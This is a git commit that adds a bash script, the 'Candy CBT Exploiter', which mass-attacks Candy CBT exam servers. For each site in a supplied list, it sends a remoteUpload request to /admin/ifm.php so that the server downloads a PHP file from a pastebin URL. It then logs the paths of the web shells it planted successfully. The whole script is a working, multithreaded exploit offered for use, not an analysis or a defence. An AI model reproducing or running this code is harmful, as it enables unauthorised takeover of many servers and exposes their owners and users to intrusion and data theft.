e6973937029f4fb17b0fc4a0cea4783d4dc689a7
Jevil36239 <51107256+Jevil36239@users.noreply.github.com>
2021-09-14 02:50:19 +0700

    Add files via upload

---
+++ cabetegalusetan.sh
@@ -0,0 +1,44 @@
+#Simple Candy CBT Exploiter
+#Multithreads Exploiter
+#CBT V.2.7.0.r0
+#Jevil36239
+#exploit path /admin/ifm.php
+#Finished by 14/SEP/2021 01:50
+#please bro jangan
+#laike rilly? cuma gini doang bjir bruh
+
+clear
+echo "
+          _________________(- Candy CBT Exploiter -)_________________
+                      __________________________________   
+                               _________________               
+"
+echo ""
+echo ""
+read -p "Masukan List : " url;
+read -p "Threads ( Default 10 ) : "  t;
+
+
+buset(){
+      local ngecurl=$(curl $site/admin/ifm.php --silent -d 'api=remoteUpload&dir=&filename=ayayayayDIooo.php&method=curl&url=https://pastebin.com/raw/xX7DDa0m' | grep -o 'File successfully uploaded')
+      if [[ $ngecurl =~ 'File successfully uploaded' ]];
+      then
+      	echo -e "-$2/$cekbaris- (-Y-) $site\n"
+      	echo "$site/files/ayayayayDIooo.php\n" | tee -a resultcbtshell.txt
+      else
+      	echo -ne "-$2/$cekbaris- (-T-) $site\n"
+      fi
+  }
+
+if [[ $t="" ]]; then
+	t=10;
+fi
+
+n=1
+IFS=$'\r\n'
+for site in $(cat $url); do
+	f=$(expr $n % $t)
+	cekbaris=$(cat $url | wc -l)
+	buset $site $n &
+	n=$[$n+1]
+  done
